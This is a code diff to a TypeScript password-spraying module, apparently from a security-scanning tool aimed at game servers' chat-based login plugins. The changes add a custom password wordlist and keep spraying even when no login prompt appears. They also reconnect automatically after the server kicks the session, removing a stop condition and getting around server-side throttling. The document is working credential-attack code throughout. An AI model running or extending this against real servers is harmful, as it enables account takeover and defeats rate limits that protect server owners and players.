@@ -21,9 +21,14 @@ export const authSpray: EngineModule = {
   title: 'Password spray against login plugin',
   async run(ctx) {
     const username = ctx.params.username?.trim() || 'Admin'
+    const customList = (ctx.params.wordlist ?? '')
+      .split(',')
+      .map((entry) => entry.trim())
+      .filter(Boolean)
+    const wordlist = customList.length > 0 ? customList : DEFAULT_WORDLIST
     const maxAttempts = Math.max(
       1,
-      Math.min(Number(ctx.params.maxAttempts) || 8, DEFAULT_WORDLIST.length)
+      Math.min(Number(ctx.params.maxAttempts) || 8, wordlist.length)
     )
     const delayMs = 2500
 
@@ -62,16 +67,6 @@ export const authSpray: EngineModule = {
 
     try {
       const prompt = await detectAuthPrompt(session)
-      if (!prompt) {
-        ctx.finding({
-          id: 'no-auth-prompt',
-          severity: 'medium',
-          title: 'No login prompt observed',
-          detail: 'Joins are accepted without a login plugin prompt; credential spraying is unnecessary — identity takeover chains apply instead.',
-          evidence: { username }
-        })
-        return
-      }
       if (prompt === 'register') {
         ctx.finding({
           id: 'account-unregistered',
@@ -82,23 +77,37 @@ export const authSpray: EngineModule = {
         })
         return
       }
+      if (!prompt) {
+        ctx.log('no login prompt observed — attempting /login spray anyway (the prompt may be broken or hidden)')
+      }
 
       for (let i = 0; i < maxAttempts; i++) {
         if (ctx.signal.aborted) return
         if (session.lastKickReason) {
-          ctx.finding({
-            id: 'spray-kicked',
-            severity: 'info',
-            title: 'Session kicked mid-spray',
-            detail: `The server interrupted the spray after ${i} attempt(s): ${session.lastKickReason}. Server-side throttling is working.`,
-            evidence: { attempts: i }
-          })
-          return
+          const kickReason = session.lastKickReason
+          ctx.log(`kicked after the previous attempt (${kickReason}) — reconnecting to continue`)
+          session.close()
+          await sleep(1500)
+          try {
+            session = await McSession.open(ctx.target, username)
+          } catch (error) {
+            ctx.finding({
+              id: 'spray-kicked',
+              severity: 'info',
+              title: 'Spray interrupted by server kick',
+              detail: `The server kicked the session (${kickReason}) and reconnection failed: ${error instanceof Error ? error.message : String(error)}. Server-side throttling is working.`,
+              evidence: { attempts: i }
+            })
+            return
+          }
         }
-        const password = DEFAULT_WORDLIST[i]
+        const password = wordlist[i]
         ctx.log(`attempt ${i + 1}/${maxAttempts}: trying "${password}"`)
         session.chat(`/login ${password}`)
-        const success = await session.waitForChat(/successful login|successfully logged|logged in/i, 2500)
+        const success = await session.waitForChat(
+          /successful login|successfully logged|logged in|登录成功/i,
+          2500
+        )
         if (success) {
           ctx.finding({
             id: 'weak-password',
